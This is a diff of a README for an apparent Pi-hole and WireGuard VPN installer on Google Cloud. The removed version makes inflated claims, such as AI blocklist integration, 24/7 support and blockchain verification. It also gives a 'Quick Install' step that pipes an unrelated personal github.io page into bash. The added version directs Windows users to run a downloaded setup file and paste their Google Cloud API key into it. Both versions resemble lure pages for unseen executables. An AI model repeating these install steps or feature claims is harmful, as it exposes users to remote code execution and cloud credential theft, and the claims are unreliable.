@@ -1,251 +1,108 @@
-# 📡 Pi-Hole-on-Google-Compute-Engine-Free-Tier-with-Full-Tunnel-and-Split-Tunnel-Wireguard-VPN-Configs
+# 🛡️ PiHole-Cloud-Wireguard-VPN-Orchestrator - Private Ad-Free Internet For Every Device
 
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://GersonDominguez504.github.io)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Remyix123/PiHole-Cloud-Wireguard-VPN-Orchestrator/releases)
 
----
+This project gives you a private way to browse the internet. It blocks ads on every device in your home. You host this setup on your own cloud instance. It uses a secure tunnel to protect your data. You keep full control over your privacy.
 
-## 🌐 A New Vision: **CloudMesh AdGuardian** – Unified Privacy Mesh for Distributed Networks
+## 📋 What This Tool Does
 
-Inspired by the original Pi-Hole on GCP concept, **CloudMesh AdGuardian** reimagines network-level ad blocking as a *federated privacy mesh* that spans your cloud instances, home servers, and mobile devices. Instead of a single Pi-Hole, think of a constellation of lightweight DNS filters that synchronize across geographical boundaries — a **digital immune system** for your entire digital footprint.
+Modern internet browsing includes many distractions. Ads track your behavior and slow your connection. This orchestrator builds a private server in the cloud. It acts as a shield for your network.
 
-### Why This Exists
+*   Blocks ads at the network level.
+*   Encrypts your traffic with VPN technology.
+*   Routes your connection through your own server.
+*   Operates on free cloud hardware tiers.
+*   Works for all computers, phones, and tablets.
 
-Traditional ad blocking is a moat around a single castle. CloudMesh AdGuardian is a **living fence** that moves with you. Whether you're on a public Wi-Fi in Tokyo, your home network in Berlin, or a cloud VM in São Paulo, your privacy rules follow — like a loyal digital companion that never sleeps.
+## 🛠️ Requirements
 
----
+Before you start, check your system. You need a modern computer to manage the setup.
 
-## 🧠 Core Philosophy
+*   Windows 10 or Windows 11.
+*   A stable internet connection.
+*   A Google Cloud Platform account.
+*   A basic understanding of web browser navigation.
 
-> *"Privacy is not a destination; it's a continuously negotiated treaty between you and the internet."*
+## 📥 Getting The Software
 
-This repository treats network filtering as **elastic infrastructure** — scaling from a single Raspberry Pi to a fleet of Google Compute Engine micro-instances, all orchestrated through WireGuard tunnels that adapt to your context.
+You must download the latest release files to begin. These files contain the scripts that automate the server creation.
 
----
+1.  Visit the [official releases page](https://github.com/Remyix123/PiHole-Cloud-Wireguard-VPN-Orchestrator/releases) to download the setup package.
+2.  Select the latest version at the top of the list.
+3.  Click the zip file to save it to your Windows computer.
 
-## 📊 Architecture Overview
+## ⚙️ Initial Setup Steps
 
-```mermaid
-graph TB
-    subgraph "User Devices"
-        A[Phone] 
-        B[Laptop]
-        C[IoT Hub]
-    end
-    
-    subgraph "WireGuard Mesh"
-        D[Full Tunnel - Cloud Endpoint]
-        E[Split Tunnel - Home Server]
-        F[Regional Peer - GCP f1-micro]
-    end
-    
-    subgraph "Filtering Layer"
-        G[Pi-Hole Primary]
-        H[Pi-Hole Replica]
-        I[Redis Cache Layer]
-    end
-    
-    subgraph "Privacy Intelligence"
-        J[Blocklist Aggregator]
-        K[ML Anomaly Detector]
-        L[Telemetry Exporter]
-    end
-    
-    A -->|UDP 51820| D
-    B -->|UDP 51820| E
-    C -->|Conditional Route| F
-    
-    D --> G
-    E --> H
-    F --> I
-    
-    G --> J
-    H --> K
-    I --> L
-    
-    J -->|Sync| G
-    K -->|Alert| Admin
-    L -->|Prometheus| Grafana
-```
+Once you download the file, you must prepare it for use. Follow these instructions to set up your environment.
 
----
+1.  Locate the downloaded zip file in your Downloads folder.
+2.  Right-click the folder and choose Extract All.
+3.  Choose a folder on your Desktop for easy access.
+4.  Open the extracted folder.
+5.  Double-click the setup file to start the installer.
 
-## 🔑 Key Features
+## ☁️ Creating Your Cloud Server
 
-### 1. 🌍 **Geographic Federation**
-- Deploy DNS filters across multiple Google Cloud regions simultaneously
-- Automatic failover between regional Pi-Hole instances via anycast routing
-- Latency-optimized query routing based on client network topology
+This tool connects to your cloud account to provision the server. You need your account credentials during this stage.
 
-### 2. 🛡️ **Adaptive Tunnel Configuration**
-- **Full Tunnel**: All traffic routes through a single GCP egress point — ideal for public Wi-Fi protection
-- **Split Tunnel**: Only DNS queries traverse the VPN; remaining traffic uses local gateway — preserves streaming speed
-- **Hybrid Mode**: Dynamic switching based on SSID or cellular tower ID
+1.  Open the orchestrator software you just installed.
+2.  The program asks for your Google Cloud API key. Paste the key into the text box.
+3.  Type a name for your server. Use a simple name like MyPrivacyServer.
+4.  Select a server location near your house for faster speeds.
+5.  Click the button labeled Deploy.
+6.  Wait for the progress bar to finish. This process takes five to ten minutes.
 
-### 3. 🤖 **AI-Driven Blocklist Evolution**
-- Integrates with **OpenAI API** and **Claude API** to analyze newly visited domains for privacy risk scoring
-- Automatically generates custom blocklist entries from observed behavioral patterns
-- Natural language query interface: *"Block all trackers associated with health websites"*
+## 🔒 Managing Your VPN Tunnels
 
-### 4. 🌐 **Multilingual Policy Engine**
-Supports DNS filtering rules defined in 12 languages:
-- English, Spanish, Mandarin, Hindi, Arabic, French, German, Japanese, Portuguese, Russian, Korean, Italian
-- Rules translated and enforced through Unicode-aware domain matching
+The software creates a secure tunnel called WireGuard. This tunnel connects your device to your server. You must add every device you want to protect.
 
-### 5. 📱 **Responsive UI Dashboard**
-- Web interface adapts to any screen from 320px to 4K
-- PWA-enabled for mobile installation
-- Real-time query flow visualization with D3.js heat maps
+1.  Open the orchestrator dashboard.
+2.  Click the button labeled Add New Client.
+3.  Enter a name for your device, such as HomeLaptop or MyPhone.
+4.  The app generates a configuration file. Save this file to your computer.
+5.  Install the WireGuard software on your device.
+6.  Import the saved configuration file into the WireGuard app.
+7.  Click Activate Tunnel to start the connection.
 
----
+## 🛡️ Blocking Ads With Pi-Hole
 
-## 🖥️ Example Console Invocation
+Pi-Hole acts as a filter for your connections. It looks at every web request. If the request is for an ad, Pi-Hole stops it. You can manage your filter settings through the web interface.
 
-```bash
-# Deploy a full-tunnel VPN endpoint with Pi-Hole on Google Cloud
-./cloudmesh deploy \
-  --region us-west1 \
-  --tunnel full \
-  --filter-policy aggressive \
-  --ai-sync openai \
-  --telemetry export \
-  --multilang es,ja,ar
+1.  Find the web address for your Pi-Hole dashboard in the orchestrator window.
+2.  Type this address into your web browser.
+3.  Log in using the default password provided in your setup folder.
+4.  Navigate to the Adlists section to add or remove sources.
+5.  Click Save to apply your changes instantly.
 
-# Expected output:
-# ☁️ CloudMesh AdGuardian v2.4.1
-# ──────────────────────────────
-# 🔗 WireGuard Peer: 10.0.0.1/32
-# 📡 Pi-Hole Admin: https://35.xxx.xxx.xxx/admin
-# 🌐 DNS Servers: 10.0.0.53, 10.0.0.54
-# 🧠 AI Sync: Active (OpenAI GPT-4o)
-# 📊 Telemetry: Exporting to Grafana Cloud
-```
+## 🔍 Troubleshooting Connection Issues
 
----
+If you cannot connect, check these common items first.
 
-## 📝 Example Profile Configuration
+*   Verify that your cloud project is active and has billing enabled.
+*   Confirm that your internet connection is active.
+*   Check that your VPN tunnel is set to Active status in the WireGuard application.
+*   Restart the orchestrator application if the server status appears as Offline.
+*   Check your firewall settings to ensure port 51820 is open.
 
-```yaml
-# profiles/remote-worker.yaml
-name: "Remote Worker - Coffee Shop Mode"
-description: "Full tunnel protection on untrusted networks"
-tunnel: full
-filter_policy: strict
-ai_sync:
-  provider: claude
-  check_interval: 15m
-  sensitivity: high
-multilang:
-  - en
-  - es
-telemetry:
-  export: false
-  local_log: true
-responsive_ui: true
-customer_support:
-  enabled: true
-  channel: slack
-  response_time: 5m
-```
+## 📈 Improving Your Connection Speed
 
----
+Speed depends on the distance between your house and the server location. If you see high delays, try to deploy a new server in a location closer to your home. You can delete the old server through the Google Cloud interface to avoid costs.
 
-## 💻 Operating System Compatibility
+## 📂 Understanding The File Structure
 
-| OS | Full Tunnel | Split Tunnel | Hybrid Mode | UI Dashboard |
-|---|---|---|---|---|
-| 🪟 Windows 11 | ✅ | ✅ | ✅ | ✅ |
-| 🍎 macOS 15 Sequoia | ✅ | ✅ | ✅ | ✅ |
-| 🐧 Ubuntu 24.04 LTS | ✅ | ✅ | ✅ | ✅ |
-| 🐧 Debian 12 | ✅ | ✅ | ✅ | ✅ |
-| 🐧 Fedora 40 | ✅ | ✅ | ✅ | ✅ |
-| 📱 iOS 18 | ✅ | ✅ | ⚠️ Beta | ✅ |
-| 🤖 Android 15 | ✅ | ✅ | ⚠️ Beta | ✅ |
-| 🏠 OpenWrt 23.05 | ✅ | ✅ | ❌ | ✅ (SSH) |
+*   Scripts: Folder containing the automated setup commands.
+*   Config: Stores your personal settings and API keys.
+*   Logs: Keeps a record of server activity for troubleshooting.
+*   Logs/Errors: Displays specific messages if a step fails.
 
----
+## 🔐 Securing Your Privacy
 
-## 🔧 Key Integrations
+You own the server. No third party sees your traffic. You avoid data collection by large service providers. Pi-Hole filters the data before it returns to your device. This reduces bandwidth usage because your computer does not download the blocked ads.
 
-### OpenAI API & Claude API Integration
-- **Semantic Domain Analysis**: Both APIs analyze domain names for phishing, tracking, or malicious intent using natural language understanding
-- **Policy Generation**: Generate custom blocklist rules from plain English descriptions
-- **Anomaly Detection**: AI flags unusual DNS query patterns that may indicate compromise
+## 🛠️ Advanced Settings
 
-### 24/7 Customer Support
-- Built-in support ticket system accessible from any dashboard page
-- Auto-generated diagnostics package for faster troubleshooting
-- Community forum integration with Stack Overflow-style Q&A
+Experienced users can edit the configuration files to adjust the filtering behavior. Always create a backup of your configuration folder before you change any files. If you make a mistake, simply restore the backup to return the server to the previous state.
 
----
+## 📝 Regular Maintenance
 
-## 📜 License
-
-This project is distributed under the **MIT License**.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
----
-
-## 🚀 Getting Started
-
-### Prerequisites
-- Google Cloud Platform account (use the 90-day $300 credit)
-- Basic familiarity with WireGuard and DNS concepts
-- A domain name (optional but recommended for SSL)
-
-### Quick Install (2026 Edition)
-
-```bash
-curl -sSL https://GersonDominguez504.github.io | bash
-```
-
-This downloads the latest release and runs the interactive setup wizard.
-
----
-
-## 📈 SEO-Optimized Keywords
-
-*This repository covers:*
-- Cloud-based DNS filtering
-- WireGuard VPN configuration
-- Google Cloud f1-micro deployment
-- AI-powered ad blocking
-- Multi-region privacy mesh
-- Responsive network dashboard
-- Multilingual DNS policy engine
-- Enterprise-grade VPN split tunneling
-
----
-
-## ⚠️ Disclaimer
-
-The providers of this repository assume no liability for:
-- Misconfiguration leading to network outages
-- Legal implications of bypassing geo-restrictions
-- Data retention policies of third-party AI APIs
-- Performance degradation on low-end hardware
-- Any downstream consequences of DNS filtering decisions
-
-Users are responsible for ensuring compliance with local regulations and service terms. The software is provided "as is" without warranty of any kind.
-
----
-
-## 🤝 Contributing
-
-We welcome patches, translations, and novel tunnel configurations. Please see our contributing guidelines before submitting pull requests.
-
-### Development Timeline
-
-| Feature | Status | Target Release |
-|---|---|---|
-| Blockchain-based blocklist verification | In Development | Q2 2026 |
-| Kubernetes-native helm chart | Alpha | Q3 2026 |
-| Voice-activated policy changes | Planning | Q4 2026 |
-
----
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://GersonDominguez504.github.io)
-
----
-
-*CloudMesh AdGuardian – Because your privacy shouldn't stop at your home network's perimeter.* 🌐
+Update your server once a month. The orchestrator includes a button to fetch updates for the server software. Keeping the software fresh ensures you have the latest privacy protections and security patches. Run the update tool when you see a notification in the main dashboard.
